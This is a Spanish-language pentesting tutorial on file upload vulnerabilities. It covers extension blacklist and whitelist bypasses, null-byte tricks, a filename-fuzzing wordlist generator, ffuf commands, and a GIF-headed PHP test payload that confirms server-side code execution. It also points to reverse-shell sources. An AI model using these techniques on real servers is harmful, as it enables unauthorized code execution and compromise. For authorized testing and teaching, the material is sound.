Un upload es peligroso cuando el servidor acepta contenido controlado por el usuario y luego:
1. **lo almacena en una ruta accesible**
2. **lo interpreta o ejecuta**
3. **lo procesa con librerías vulnerables**
4. **confía en metadatos manipulables**
5. **lo reutiliza en otros contextos**, por ejemplo HTML, PDF, XML, imágenes, backups, CDN, antivirus, indexadores

Una de las vulnerabilidades más comunes ocurre cuando no hay ningún tipo de validación a la hora de subir un archivo. Una forma fácil de saber si hay algún tipo de validación es ver si el cuadro de diálogo permite `All Files`

## Web shells
[Artículo interesante](https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/)
### Ya creadas
- `/usr/share/webshells/` en kali
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) - para varios lenguajes y CMS
- [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell) - Revshell

### Clilent-side validation
Cuando la validación se hace de parte del cliente, basta con envíar un archivo que acepte el cliente (ej: `jpeg`) e interceptar la petición para envíar el archivo que queramos
## Blacklist extensions
Ocurre cuando no se permite subir un archivo determinado porque está blacklisteado, p. ej: 
```php
$fileName = basename($_FILES["uploadFile"]["name"]); $extension = pathinfo($fileName, PATHINFO_EXTENSION); $blacklist = array('php', 'php7', 'phps'); if (in_array($extension, $blacklist)) { echo "File type not allowed"; die(); }
```
Esto se puede bypasear haciendo fuzzing de extensiones.

## Whitelist extensions
En este caso se esperan extensiones de un formato determinado, por ejemplo, con expresiones regulares como la que sigue:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```
Si el backend fuera del estilo como sigue 
```php
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```
un archivo con el formato `malicius.php.jpg` podría pasar como válido.
Hay otros carácteres que hacen que la aplicación malinterprete lo que el usuario está introduciendo, p.ej `shell.php%00.jpg` se guardaría como `shell.php` en el back en servidores php `5.x` o anteriores.  

## Fuzzing
Revisar la creación de la [herramienta en github](https://github.com/an0nio/fileUpload-dictionary-toolkit)

### Caso práctico
Script interesante para generar un diccionario para bypasear extensiones.
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.pht' '.phps' '.phar' '.phpt' '.pgif' '.phtml' '.phtm' '.inc' ; do
	echo "shell$char$ext.jpg" >> wordlist.txt
	echo "shell$ext$char.jpg" >> wordlist.txt
	echo "shell.jpg$char$ext" >> wordlist.txt
	echo "shell.jpg$ext$char" >> wordlist.txt
done
done
```
Una vez hemos hecho fuzzing y encontrado las extensiones válidas de subida de archivo, p.ej: `fuzzingValido`, del siguiente modo: 

```bash
# Primero fuzzing
ffuf -request upload.req -request-proto http -w wordlist.txt -mr 'File successfully uploaded' -o fuzzing_results
# Después guardar solo los resultados en un archivo
jq -r '.results.[].input.FUZZ' fuzzing_results > fuzzingValido
```
podemos utilizar el siguiente script para generar otro diccionario con el que probar si el archivo se ha subido correctamente
```python
#!/usr/bin/env python3
from urllib.parse import unquote, quote
import sys
import re

CONTROL_CHARS = ["\x00", "\n", "\r", "\t", "\x0b", "\x0c"]

def add(out, value):
    value = value.strip()
    if value:
        out.add(value)

def url_quote_path(s):
    """
    Codifica caracteres problemáticos para URL path.
    Mantiene / para probar casos path-like tipo shell.php/.jpg.
    """
    return quote(s, safe="/._-~:")

def remove_controls(s):
    for c in CONTROL_CHARS:
        s = s.replace(c, "")
    return s

def truncate_at_controls(s):
    positions = [s.find(c) for c in CONTROL_CHARS if c in s]
    if not positions:
        return s
    return s[:min(positions)]

def normalize_windowsish(s):
    """
    Casos típicos de normalización:
    - trailing dot
    - trailing space
    - backslash tratado raro
    """
    variants = set()

    variants.add(s.rstrip(" ."))
    variants.add(s.replace("\\", ""))
    variants.add(s.replace("\\", "/"))
    variants.add(s.replace("/.", "."))
    variants.add(s.replace("./", ""))

    return variants

def generate(name):
    out = set()

    original = name.strip()
    if not original:
        return out

    # 1. Tal cual, por si quieres que el servidor decodifique %XX en la URL
    add(out, original)

    # 2. Literal seguro: si el backend guardó "%0a" como texto,
    # hay que pedir "%250a"
    add(out, url_quote_path(original))

    # 3. Decode una vez: %0a -> newline, %20 -> espacio, %00 -> NUL
    dec1 = unquote(original)
    add(out, url_quote_path(dec1))

    # 4. Decode dos veces: útil si tenías %2500, %252f, etc.
    dec2 = unquote(dec1)
    add(out, url_quote_path(dec2))

    # 5. Si el backend eliminó caracteres de control
    add(out, url_quote_path(remove_controls(dec1)))
    add(out, url_quote_path(remove_controls(dec2)))

    # 6. Si el backend truncó en NUL/newline/tab/CR
    add(out, url_quote_path(truncate_at_controls(dec1)))
    add(out, url_quote_path(truncate_at_controls(dec2)))

    # 7. Si hizo trim de espacios/puntos al final
    add(out, url_quote_path(dec1.strip(" .\r\n\t\x00")))
    add(out, url_quote_path(dec2.strip(" .\r\n\t\x00")))

    # 8. Normalizaciones tipo Windows / parser raro
    for v in normalize_windowsish(dec1):
        add(out, url_quote_path(v))

    for v in normalize_windowsish(dec2):
        add(out, url_quote_path(v))

    # 9. Casos comunes: eliminar %XX conflictivos sin decodificar
    raw_removed = re.sub(r"%00|%0a|%0A|%0d|%0D|%09|%20", "", original)
    add(out, raw_removed)
    add(out, url_quote_path(raw_removed))

    return out

def main():
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} fuzzingValido", file=sys.stderr)
        sys.exit(1)

    all_candidates = set()

    with open(sys.argv[1], "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            name = line.strip()
            if not name:
                continue

            for candidate in generate(name):
                all_candidates.add(candidate)

    for c in sorted(all_candidates):
        print(c)

if __name__ == "__main__":
    main()
```

Probamos qué nombres existen realmente en la carpeta pública:
```bash
# generamos candidatos válidos
./gen_get_candidates.py fuzzingValido > candidatos_get.txt
# probamos si devuelve algo distinto a 404
ffuf \  
-w candidatos_get.txt \  
-u "$target/profile_images/FUZZ" \  
-mc all \  
-fc 404 \  
-raw \  
-of json \  
-o getExistentes.json
```
En lugar de subir una reverse shell directamente, es mejor subir primero un payload de prueba con un marcador único.
`cGhwX2Z1bmNpb25h` es `php_funciona` en base64:
```php
GIF87a
<?php
echo base64_decode("cGhwX2Z1bmNpb25h") . "\n";
echo "basename_hex=" . bin2hex(basename(__FILE__)) . "\n";
echo "request_uri=" . ($_SERVER["REQUEST_URI"] ?? "") . "\n";
?>
```
Si el servidor interpreta PHP, la respuesta contendrá:

```
php_funciona
```

Entonces buscamos ejecución real:

```bash
ffuf \
-w candidatos_get.txt \
-u "http://$target/profile_images/FUZZ" \
-mr 'php_funciona' \
-raw -o getRCE.json 
```
## Upload limitado 

Si el upload no permite código ejecutable, podemos buscar impacto mediante algunos formatos:

```
HTML/SVG → XSS
SVG/XML → XXE / SSRF
JPG/PNG → EXIF / parsers / dimensiones
ZIP/TAR → Zip Slip / extracción
PDF/Office → parser abuse
archivos grandes → resource exhaustion controlado
```


En la [herramienta de github](https://github.com/an0nio/fileUpload-dictionary-toolkit) hay incluidos algunos payloads útiles en `wordlists/content/limited_upload`